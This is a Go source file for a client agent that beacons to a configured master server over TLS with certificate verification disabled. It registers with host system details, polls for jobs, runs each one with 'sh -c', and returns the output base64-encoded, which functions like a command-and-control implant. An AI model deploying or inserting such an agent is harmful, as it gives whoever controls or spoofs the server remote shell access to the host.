package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/elastic/go-sysinfo"
	"github.com/gobuffalo/packd"
	"github.com/gobuffalo/packr/v2"
	"log"
	"math/rand"
	"os/exec"
	"time"
)

type ClientConfig struct {
	Master   string `json:"master"`
	Password string `json:"password"`
	Random   bool   `json:"random"`
	ClientID int    `json:"clientid"`
	Name     string `json:"name"`
	Wait     int    `json:"wait"`
}

type Event struct {
	Id         int
	Timestamp  time.Time
	Action     string
	Parameters map[string]string
	Auth       string
}

type Response struct {
	Id              int
	ResponseCode    int
	ResponseMessage string
	ResponseData    map[string]string
}

// HostInfo contains basic host information.
type HostInfo struct {
	Architecture      string    `json:"architecture"`            // Hardware architecture (e.g. x86_64, arm, ppc, mips).
	BootTime          time.Time `json:"boot_time"`               // Host boot time.
	Containerized     *bool     `json:"containerized,omitempty"` // Is the process containerized.
	Hostname          string    `json:"name"`                    // Hostname
	IPs               []string  `json:"ip,omitempty"`            // List of all IPs.
	KernelVersion     string    `json:"kernel_version"`          // Kernel version.
	MACs              []string  `json:"mac"`                     // List of MAC addresses.
	OS                *OSInfo   `json:"os"`                      // OS information.
	Timezone          string    `json:"timezone"`                // System timezone.
	TimezoneOffsetSec int       `json:"timezone_offset_sec"`     // Timezone offset (seconds from UTC).
	UniqueID          string    `json:"id,omitempty"`            // Unique ID of the host (optional).
}

// OSInfo contains basic OS information
type OSInfo struct {
	Family   string `json:"family"`             // OS Family (e.g. redhat, debian, freebsd, windows).
	Platform string `json:"platform"`           // OS platform (e.g. centos, ubuntu, windows).
	Name     string `json:"name"`               // OS Name (e.g. Mac OS X, CentOS).
	Version  string `json:"version"`            // OS version (e.g. 10.12.6).
	Major    int    `json:"major"`              // Major release version.
	Minor    int    `json:"minor"`              // Minor release version.
	Patch    int    `json:"patch"`              // Patch release version.
	Build    string `json:"build,omitempty"`    // Build (e.g. 16G1114).
	Codename string `json:"codename,omitempty"` // OS codename (e.g. jessie).
}

func sendAndReceive(config *ClientConfig, event *Event) Response {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Recovered", r)
		}
	}()
	tlsConfig := tls.Config{InsecureSkipVerify: true}
	client, err := tls.Dial("tcp", config.Master, &tlsConfig)
	defer client.Close()
	if err != nil {
		log.Printf("connection error: %s", err)
	}
	jsonLogin, err := json.Marshal(event)
	if err != nil {
		log.Printf("json marshal error: %s", err)
	}
	_, err = client.Write([]byte(string(jsonLogin) + "\n"))
	if err != nil {
		log.Printf("client write error: %s", err)
	}
	r := bufio.NewReader(client)
	msg, err := r.ReadString('\n')
	if err != nil {
		response := &Response{
			0,
			1,
			"bufio error",
			map[string]string{},
		}
		log.Printf("bufio reader error, is the auth password set in redis?: %s", err)
		return *response
	}
	var response Response
	err = json.Unmarshal([]byte(msg), &response)
	if err != nil {
		log.Printf("response unmarshal error: %s", err)
	}
	log.Println(response)
	return response
}

func processJobs(config *ClientConfig, jobResponse Response) {
	for k, v := range jobResponse.ResponseData {
		log.Printf("processing jobs: %s, %s", k, v)
		cmd := exec.Command("sh", "-c", v)
		var out bytes.Buffer
		cmd.Stdout = &out
		err := cmd.Run()
		if err != nil {
			fmt.Println(err)
		}
		jobResult := &Event{
			config.ClientID,
			time.Now(),
			"jobresult",
			map[string]string{
				"job":  k,
				"data": base64.StdEncoding.EncodeToString([]byte(out.String())),
			},
			config.Password,
		}
		log.Println(jobResult)
		sendAndReceive(config, jobResult)
	}
	if jobResponse.ResponseCode == 0 {
		deleteJob(config, jobResponse)
	}
}

func deleteJob(config *ClientConfig, jobResponse Response) {
	log.Printf("deleting job: %s", jobResponse)
	for i := range jobResponse.ResponseData {
		job := &Event{
			config.ClientID,
			time.Now(),
			"deletejob",
			map[string]string{
				"job": i,
			},
			config.Password,
		}
		result := sendAndReceive(config, job)
		log.Printf("delete job result: %s", result)

	}
}

func getJobs(config *ClientConfig, event *Event) Response {
	return sendAndReceive(config, event)
}

func registerWithServer(config *ClientConfig, registration *Event) Response {
	return sendAndReceive(config, registration)

}

func getConfig() (packd.Box, *ClientConfig) {
	box := packr.New("config", "./config")
	config := &ClientConfig{}
	s, err := box.FindString("config.json")
	err = json.Unmarshal([]byte(s), &config)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(config)
	return box, config
}

func main() {
	_, config := getConfig()
	if config.Random {
		rand.Seed(time.Now().UnixNano())
		config.ClientID = rand.Intn(10000-1) + 1
		log.Printf("random id generated: %d", config.ClientID)
	}
	fmt.Println()
	log.Println(config.Master, config.Password)
	log.Println("getting system information")
	info, err := sysinfo.Host()
	if err != nil {
		log.Printf("unable to get system information, #{err}")
	}
	log.Println(info)
	infoJson, _ := json.Marshal(info.Info())
	log.Println(infoJson)
	login := &Event{
		config.ClientID,
		time.Now(),
		"checkin",
		map[string]string{
		},
		config.Password,
	}
	for {
		response := sendAndReceive(config, login)
		if response.Id == 1 && response.ResponseCode == 1 {
			registration := &Event{
				config.ClientID,
				time.Now(),
				"register",
				map[string]string{
					"name":    config.Name,
					"sysinfo": string(infoJson),
				},
				config.Password,
			}
			log.Printf("registering with server %v", registration)
			response = registerWithServer(config, registration)
			log.Println("registration complete")
		}
		if response.Id == 1 && response.ResponseCode == 0 {
			log.Println("getting jobs")
			jobs := &Event{
				config.ClientID,
				time.Now(),
				"getjobs",
				map[string]string{
					"params": "all",
				},
				config.Password,
			}
			jobresult := getJobs(config, jobs)
			if len(jobresult.ResponseData) > 0 {
				processJobs(config, jobresult)
			}
		}
		wait := time.Duration(config.Wait) * time.Second
		time.Sleep(wait)
		log.Println("ended sleep")
	}
}
